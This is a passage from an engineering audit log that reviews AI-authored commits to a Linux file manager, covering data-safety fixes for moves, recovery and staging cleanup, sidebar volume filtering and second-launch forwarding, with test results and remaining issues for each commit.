- `execute_merging_transfer` now uses `ReplacementTransaction` (a journal and a backup) instead of the unjournaled `move_destination_aside`.
- After the source is published into the destination, and before old entries are merged back, a durable "merging" marker is written (`create_new`, 0600, `sync_all` plus a parent fsync). The marker helpers are shared with the published marker from `c31cea2`.
- **Recovery rolls forward.** If the merging marker exists and the destination exists, `merge_directory_entries` moves the remaining backup entries into the destination. It recurses into directories on both sides, uses `RENAME_NOREPLACE`, and treats any other name clash as `Conflict` → `RecoveryRequired` with the backup kept. At every step each entry is in exactly one of the two places, so nothing is lost.
- Merging and published markers present at the same time are refused as conflicting.

**Remaining (low):**

- Old `.musheen-stage-*` debris is still never cleaned up (the rest of 4.4).
- `merge_directory_entries` fsyncs both parent directories for every moved entry, which is slow for merges with many entries.

### `0bc901b` fix(sidebar): show mounted user storage (2026-09-23 07:33)

**Scope:** 2 files, +142/−4. This commit targets the `361eb3b` sidebar regression.

**New rule in `is_sidebar_volume`:**

- Always hide loop devices and pseudo filesystem types: `autofs`, `binfmt_misc`, `bpf`, `cgroup`/`cgroup2`, `configfs`, `debugfs`, `devpts`, `devtmpfs`, `efivarfs`, `fusectl`, `hugetlbfs`, `mqueue`, `nsfs`, `overlay`, `proc`, `pstore`, `securityfs`, `sysfs`, `tracefs`.
- Otherwise, show a volume if its UDisks descriptor is visible **or** it is mounted under `/media`, `/mnt`, `/run/media`, or at least two levels deep under `/home`.
- Volumes with no descriptor (from the mount-table fallback) now show only when mounted in one of those user locations.

**Checks:**

- The `musheen-ui` volumes integration tests pass on an exported copy of the commit (7 passed, 0 failed).
- **Runtime (lead reviewer):** the owner's data drives are back: three "data" volumes and `nvme0n1p2` (`~/backup`). The kernel, systemd, and Docker mounts are gone. Screenshot: [sidebar-fixed.png](opus-audit/sidebar-fixed.png).

**Assessment: the regression is fixed.**

**Remaining (low):**

- **A FUSE clipboard mount leaks through.** The FreeRDP clipboard FUSE mount (`com.freerdp.client.cliprdr.*`, type `fuse` from `/dev/fuse`) still shows, because `TMPDIR` on this machine is under `/home/shawn/workspace2/scratchpads/tmp` and the rule accepts any mount two levels into `/home`. Suggested refinement: skip mounts inside hidden or temp directories, and plain `fuse` mounts unless they are a known user type (`fuse.sshfs`, `fuse.rclone`, and similar).
- **Duplicate labels: not a defect.** The owner confirmed that three drives really are labelled "data", and Dolphin shows them the same way. The free-space figure already tells them apart. A tooltip with the mount point would be a small extra.

### Model change: 2026-09-23 08:01

The owner moved Codex from ChatGPT Sol 5.6 to 6. Commits from here on come from the new model. Commits up to and including 0bc901b came from 5.6. At the switch, the worktree had uncommitted changes in copy, move, mutation, queue, operations, and dialogs.

### `e6037eb` fix(ops): confirm metadata loss before source removal (2026-09-23 08:26)

This is the first commit from the new model. **Scope:** 16 files, +1,120/−146. It targets audit **4.6**: before this commit, moves deleted the source without reporting metadata that was not preserved.

**What changed:**

- `execute_move` no longer removes the source when the metadata report is incomplete. It returns a `MoveMetadataReview` instead.
- The queue marks the job Failed ("needs attention"), and a new dialog asks the user to keep the source or remove it.
- **Keep source** is the default, and closing the dialog also keeps the source. Both choices are safe.
- **Remove source** runs `complete_move_after_metadata_review`. It re-verifies the destination against the saved source snapshot, then removes the source by descriptor.
- The status center shows which metadata kinds were lost.
- Strings were added to en-US, en-XA, and ar.

**Verification (lead reviewer, exported copy):**

- `cargo test -p musheen-ops -p musheen-local -p musheen-ui` passed: 467 tests, 0 failed.
- A probe test, added to the exported copy only, moved items from `/dev/shm` (tmpfs) to ext4 with the real `LocalStore`:

  | Item moved | Review asked for? | Kinds reported as lost | Source kept |
  |---|---|---|---|
  | plain file | no | none | no (moved) |
  | symlink | **yes** | timestamps, mode, ownership, xattrs, ACLs | yes |
  | folder containing one symlink | **yes** | timestamps, mode, ownership, xattrs, ACLs | yes |

**Assessment: 4.6 is fixed in the safe direction, but it adds a false alarm (confirmed by test).**

- **Symlinks always trigger the review (Medium, usability regression).** `copy_metadata` reports all five kinds as skipped for any symlink. Linux cannot set these on a symlink, so this loss is expected and harmless. Inside a folder they go into `partial_metadata_skips`, but `MetadataReport::with_partially_skipped` (`metadata_copy.rs:31`) inserts them into `skipped`, so `complete()` returns false. As a result, any move to another drive of a folder that holds one symlink stops and warns that permissions, ownership, and timestamps were lost. Git repos, `node_modules`, Python venvs, and dotfile folders all contain symlinks. The warning is also misleading: every regular file kept its metadata.
  - Suggested fix: do not count symlink-only skips toward `complete()`, or keep partial skips in a separate list that the dialog shows as information only.
- **Probably one dialog per item (Low, from code reading, not run).** Each source in a drop becomes its own job, and each job that needs review opens its own window. A multi-item move to a FAT or exFAT USB drive, where ownership and mode cannot be set, would open one dialog per item.
- **The review is held only in memory (Low).** If the app exits while a review is open, both copies stay and the job stays "needs attention" with no way to finish it. No data is lost.
- **The cut clipboard can stay set (Low).** After "Keep source", the job leaves `pending_cut_jobs`, but `file_clipboard` is not cleared, so the items still look cut.

**Still open from `c6d8809`:** 4.7 (the removal token is taken at removal time, not verify time) and the rest of 4.4 (old staging debris). The copy-time snapshot is now re-verified at confirmation time, which narrows 4.7 for reviewed moves only.

### `e9698e0` fix(startup): forward second launches (2026-09-23 08:44)

**Scope:** 8 files, +354/−22. This commit targets the silent second-launch exit from `5e9ca8c`, and moves the lock as the audit suggested.

**What changed:**

- The instance lock moves to `$XDG_RUNTIME_DIR/musheen/instance.lock`. The old `~/.config/musheen/instance.lock` is also held, so an older build cannot run recovery at the same time.
- If the runtime lock fails with an I/O error, the app falls back to the old path. It stops only when both fail, and it now prints the error and exits with status 1.
- The running app exports a private D-Bus name, `org.musheen.FileManager1`, in addition to the standard `org.freedesktop.FileManager1`.
- A second launch calls `ShowFolders` on the private name with its path. A relative path is resolved against the current directory, and the call passes the activation token. It retries for up to 5 seconds while the first instance starts.

**Verification (lead reviewer, exported copy):**

- The bin unit tests (2), `instance_forwarding` (1), and `musheen-desktop` `file_manager1` (8) all passed.
- **Runtime:** I launched the first instance on the 20-file folder, then ran `musheen <5,000-file folder>`. The second process exited with status 0 after 0.07 s. The first instance opened a window on the 5,000-file folder, and it loaded all 5,000 items. The lock file was at `/run/user/1000/musheen/instance.lock`. Screenshot: [second-launch-forwarded.png](opus-audit/second-launch-forwarded.png).

**Assessment: fixed.**

**Remaining (low):**

- **Log noise.** Dolphin owns `org.freedesktop.FileManager1` on this desktop, so the first instance prints "could not export org.freedesktop.FileManager1: name already taken" on every retry for as long as it runs. This is not new in this commit. It should log once and back off, or skip the standard name while another file manager owns it.
- **The lock can still block startup.** If both lock paths fail, the app still refuses to start. It now says why, which is better than a silent exit.
- **Seen in the same screenshot, still open:** the FreeRDP clipboard mount in the sidebar, centered sidebar items, and pill-style toolbar buttons (3.6 and 3.7).

### `e059177` fix(ops): bind source removal to verification (2026-09-23 08:56)

**Scope:** 4 files, +163/−24. This commit targets audit **4.7**: source removal took its token after publish, so a change made between verify and publish could be deleted without being copied.

**What changed:**

- `CopySession` is split into `stage_copy`, `verify_staged`, and `publish_verified`.
- A new `execute_for_move` takes the removal token (`prepare_source_removal`) **after staging and before verification**, then verifies, then publishes.
- `remove_source` takes the token captured before verification. It rebuilds the descriptor plan and refuses to remove anything if the new plan differs.
- `MoveMetadataReview` now carries the token too, so a move confirmed later removes exactly what was verified.

**Why this closes the gap (checked in `operation.rs`):**

- The token is a BLAKE3 hash of every entry's name and descriptor identity. File identities include size, mtime, and ctime.
- During removal, `execute_descriptor_removal` also compares the actual child names with the plan in each directory, and it rechecks each entry's identity before `unlinkat`.
- A change before the token is taken is caught by verification. A change after it (an added, removed, renamed, or rewritten entry, and any rewrite changes ctime) makes removal stop with `SourceChanged`.

**Verification (lead reviewer, exported copy):** `cargo test -p musheen-ops -p musheen-local` passed: 131 tests, 0 failed. The two new tests, `cross_filesystem_move_prepares_removal_before_publication` and `source_removal_preparation_failure_never_publishes`, use the fake provider. No real-filesystem test covers a change made between verification and removal.

**Assessment: 4.7 is fixed (code and fake-provider tests).**

**Remaining (low):**

- A move whose review stays open a long time will usually fail with `SourceChanged` if anything touches the source in the meantime. That is the safe outcome, but the message should say that the source changed and the destination copy was kept.
- The symlink false alarm from `e6037eb` is still open.

**Data-safety status (section 4) at `e059177`:**

- Fixed: 4.1, 4.2, 4.3, 4.6, 4.7.
- Mostly fixed: 4.4. Old `.musheen-stage-*` debris is still never cleaned up.
- Partial: 4.5. Directory publish on NFS or sshfs is not atomic.
- Not rechecked: 4.8 and 4.9.

### `486bdeb` fix(recovery): remove stale staging safely (2026-09-23 09:11)

**Scope:** 3 files, +204/−13. This commit targets the rest of audit **4.4**: old `.musheen-stage-*` debris was never cleaned up.

**What changed:**

- At startup, `recover_local_operation_artifacts` visits each directory in the status history once.
- It runs replacement recovery first. Only if recovery succeeds does it call the new `LocalStore::cleanup_stale_staging_at`.
- The cleanup removes only names that `StagingPath::is_owned_path` fully parses: the prefix, a non-zero job number, a generation, and an optional 32-hex nonce.
- Staging recorded as a job's recovery staging is kept.
- Removal uses `remove_path`, which does not cross mounts, and the parent directory is synced afterwards.

**Verification (lead reviewer, exported copy):** `cargo test -p musheen-local -p musheen-ui` passed: 402 tests, 0 failed. The new tests cover these cases:

- a stale staging tree is removed
- protected staging is kept
- a look-alike name (`.musheen-stage-v1-not-a-job`) and an unrelated file are kept

**Assessment: 4.4 is fixed.**

**Remaining (low, from code reading):**

- **Startup can be slow.** The cleanup runs while `OperationHub` is built on the UI thread, before the first window. A large stale partial copy, such as a big interrupted folder copy, is deleted before the window appears.
- **Shared folders.** Staging owned by another user in a shared writable folder without the sticky bit would also be removed. This is rare.

### `56cc6d4` fix(ops): ignore inapplicable symlink metadata (2026-09-23 09:16)

**Scope:** 4 files, +54/−5. This commit fixes the symlink false alarm from `e6037eb`.

**What changed:**

- `MetadataReport` gets a separate `partially_skipped` list, and `with_partially_skipped` no longer writes into `skipped`.
- For a symlink at the root of the move, the metadata skips now go to the partial list.

**Verification (lead reviewer, exported copy):**

- `cargo test -p musheen-ops -p musheen-local` passed: 134 tests, 0 failed.
- I re-ran the same probe as for `e6037eb` (tmpfs to ext4, real `LocalStore`):

  | Item moved | Review asked for? | `skipped` | Source removed |
  |---|---|---|---|
  | plain file | no | none | yes |
  | symlink | **no** | none (partial: the five symlink kinds) | yes |
  | folder containing one symlink | **no** | none (partial: the five symlink kinds) | yes |

**Assessment: fixed.**

### `3512424` fix(ui): clear cancelled cut state (2026-09-23 09:19)

**Scope:** 1 file, +32/−1. After "Keep source" in the metadata review, the whole cut clipboard and the pending cut jobs are now cleared, so the items no longer look cut. A unit test covers the helper; I did not run it separately.

**Assessment: fixed.** One inconsistency (low): a failed move keeps the cut clipboard so the user can retry, but "Keep source" empties it.

### Ordering note, 2026-09-23 09:37

The uncommitted work in the worktree has moved to archive creation (`archive/create.rs`, `operation_journal.rs`, plus queue and UI wiring), and Codex is running archive tests. Under the agreed order, archive and remote work comes after the UI fixes are verified in the GUI. These UI items are still open:

- fixed-pixel row height, pill-style buttons, and centered sidebar items (3.6 and 3.7)
- no Delete key for Trash, and no New Folder shortcut
- the cut and copy clipboard is not shared with other apps
- the FreeRDP FUSE mount shows in the sidebar

### Pointer, 2026-09-25

Later entries are in `docs/opus-audit-2.md`, section 12.
